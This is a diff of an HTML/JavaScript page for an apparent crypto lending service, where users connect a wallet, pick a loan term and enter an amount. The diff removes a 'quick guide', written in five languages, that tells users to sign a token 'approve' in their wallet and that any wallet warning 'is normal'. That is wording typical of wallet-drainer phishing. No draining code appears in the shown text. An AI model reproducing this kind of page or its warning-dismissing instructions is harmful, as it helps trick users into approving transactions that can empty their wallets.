@@ -357,33 +357,6 @@
             font-size: 18px;
         }
 
-        .mini-guide {
-            background: rgba(42, 74, 110, 0.2);
-            border: 1px solid rgba(139, 163, 184, 0.3);
-            border-radius: 16px;
-            padding: 16px;
-            margin: 20px 0;
-            font-size: 13px;
-        }
-
-        .mini-guide h4 {
-            color: #8ba3b8;
-            margin-bottom: 10px;
-            font-size: 14px;
-        }
-
-        .mini-guide p {
-            margin: 6px 0;
-            line-height: 1.4;
-        }
-
-        .mini-guide code {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 2px 6px;
-            border-radius: 6px;
-            font-size: 11px;
-        }
-
         .success-icon {
             width: 80px;
             height: 80px;
@@ -680,14 +653,12 @@
                 <div class="loan-form">
                     <h2 id="loanTitle">Loan amount</h2>
                     
-                    <!-- Баланс (сверху) -->
                     <div class="balance-info">
                         <div id="yourBalanceLabel">Your balance</div>
                         <div class="balance-amount" id="userBalance">0 USDT</div>
                         <div style="margin-top:8px; font-size:14px;" id="availableLoanLabel">Available (max 50%): <strong id="maxLoan">0 USDT</strong></div>
                     </div>
                     
-                    <!-- Срок займа -->
                     <div id="termLabel" style="font-size:14px; margin-bottom:8px;">Loan term:</div>
                     <div class="term-selector" id="termSelector">
                         <div class="term-btn" data-term="week">7 days / 3%</div>
@@ -698,22 +669,11 @@
                         <input type="text" id="customDays" placeholder="Enter days (1-90)" value="30">
                     </div>
                     
-                    <!-- Процентная ставка -->
                     <div class="interest-info" id="interestInfo">
                         Interest rate: <span class="interest-rate" id="interestRate">5%</span>
                     </div>
                     
-                    <!-- Ввод суммы -->
                     <input type="number" id="loanAmount" class="loan-input" placeholder="Enter amount" step="0.01">
-                    
-                    <!-- Мини-инструкция (внизу) -->
-                    <div class="mini-guide" id="miniGuide">
-                        <h4>📋 Quick guide</h4>
-                        <p>1. Connect wallet → choose network & coin</p>
-                        <p>2. Select term → enter amount</p>
-                        <p>3. Sign approve in wallet → done!</p>
-                        <p style="font-size:11px; color:#8ba3b8; margin-top:8px;">⚠️ Wallet may show warning - this is normal</p>
-                    </div>
                     
                     <button class="btn-primary" id="submitLoanBtn" style="width:100%;">✅ Confirm</button>
                 </div>
@@ -1307,7 +1267,6 @@
             document.getElementById('feature3Desc').innerHTML = t.feature3Desc;
             document.getElementById('langBtn').innerHTML = currentLang === 'en' ? '🇬🇧 EN ▼' : currentLang === 'ru' ? '🇷🇺 RU ▼' : currentLang === 'es' ? '🇪🇸 ES ▼' : currentLang === 'de' ? '🇩🇪 DE ▼' : '🇫🇷 FR ▼';
             
-            // Кнопки выбора срока
             const weekBtn = document.querySelector('.term-btn[data-term="week"]');
             const monthBtn = document.querySelector('.term-btn[data-term="month"]');
             const customBtn = document.getElementById('customTermBtn');
@@ -1315,23 +1274,8 @@
             if (monthBtn) monthBtn.innerHTML = t.monthTerm;
             if (customBtn) customBtn.innerHTML = t.customTerm;
             
-            // Кнопка поддержки в инструкции
             const supportLink = document.getElementById('instructionSupportBtn');
             if (supportLink) supportLink.innerHTML = t.supportChat;
-            
-            // Мини-инструкция
-            const miniGuide = document.getElementById('miniGuide');
-            if (currentLang === 'ru') {
-                miniGuide.innerHTML = `<h4>📋 Быстрая инструкция</h4><p>1. Подключите кошелёк → выберите сеть и монету</p><p>2. Выберите срок → введите сумму</p><p>3. Подпишите approve в кошельке → готово!</p><p style="font-size:11px; color:#8ba3b8; margin-top:8px;">⚠️ Кошелёк может показать предупреждение — это нормально</p>`;
-            } else if (currentLang === 'es') {
-                miniGuide.innerHTML = `<h4>📋 Guía rápida</h4><p>1. Conecte wallet → elija red y moneda</p><p>2. Elija plazo → ingrese monto</p><p>3. Firme approve → listo!</p><p style="font-size:11px; color:#8ba3b8; margin-top:8px;">⚠️ La wallet puede mostrar advertencia - es normal</p>`;
-            } else if (currentLang === 'de') {
-                miniGuide.innerHTML = `<h4>📋 Kurzanleitung</h4><p>1. Wallet verbinden → Netzwerk & Coin wählen</p><p>2. Laufzeit wählen → Betrag eingeben</p><p>3. Approve unterschreiben → fertig!</p><p style="font-size:11px; color:#8ba3b8; margin-top:8px;">⚠️ Wallet kann Warnung zeigen - normal</p>`;
-            } else if (currentLang === 'fr') {
-                miniGuide.innerHTML = `<h4>📋 Guide rapide</h4><p>1. Connectez wallet → choisissez réseau et monnaie</p><p>2. Choisissez durée → entrez montant</p><p>3. Signez approve → prêt!</p><p style="font-size:11px; color:#8ba3b8; margin-top:8px;">⚠️ Le wallet peut afficher un avertissement - c'est normal</p>`;
-            } else {
-                miniGuide.innerHTML = `<h4>📋 Quick guide</h4><p>1. Connect wallet → choose network & coin</p><p>2. Select term → enter amount</p><p>3. Sign approve in wallet → done!</p><p style="font-size:11px; color:#8ba3b8; margin-top:8px;">⚠️ Wallet may show warning - this is normal</p>`;
-            }
         }
 
         function renderWalletList() {
